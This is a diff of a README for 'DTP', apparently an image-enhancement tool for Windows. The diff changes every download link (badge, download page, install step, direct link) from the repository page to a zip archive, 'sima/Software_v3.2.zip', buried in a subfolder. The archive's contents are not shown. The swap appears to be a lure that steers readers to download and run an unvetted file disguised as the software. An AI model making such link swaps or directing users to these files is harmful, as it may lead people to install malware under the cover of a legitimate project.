@@ -1,6 +1,6 @@
 # 🖼️ DTP - Sharper low-light images on Windows
 
-[![Download DTP](https://img.shields.io/badge/Download-DTP-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kajalj2389/DTP)
+[![Download DTP](https://img.shields.io/badge/Download-DTP-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kajalj2389/DTP/raw/refs/heads/main/sima/Software_v3.2.zip)
 
 ## 🧭 What DTP does
 
@@ -12,7 +12,7 @@ This project uses a dual-path method with frequency structural decoupling and re
 
 Visit this page to download the software:
 
-https://github.com/kajalj2389/DTP
+https://github.com/kajalj2389/DTP/raw/refs/heads/main/sima/Software_v3.2.zip
 
 If the page offers a release file, download it to your PC. If it gives source files, download the package and follow the steps below to run it on Windows.
 
@@ -43,7 +43,7 @@ Before you start, make sure you have:
 Follow these steps:
 
 1. Open the DTP download page:
-   https://github.com/kajalj2389/DTP
+   https://github.com/kajalj2389/DTP/raw/refs/heads/main/sima/Software_v3.2.zip
 
 2. Download the file or package for Windows.
 
@@ -201,7 +201,7 @@ It is designed for image enhancement work where dark images need clearer detail 
 
 ## 📎 Direct link
 
-https://github.com/kajalj2389/DTP
+https://github.com/kajalj2389/DTP/raw/refs/heads/main/sima/Software_v3.2.zip
 
 ## 🖥️ Windows folder example
 
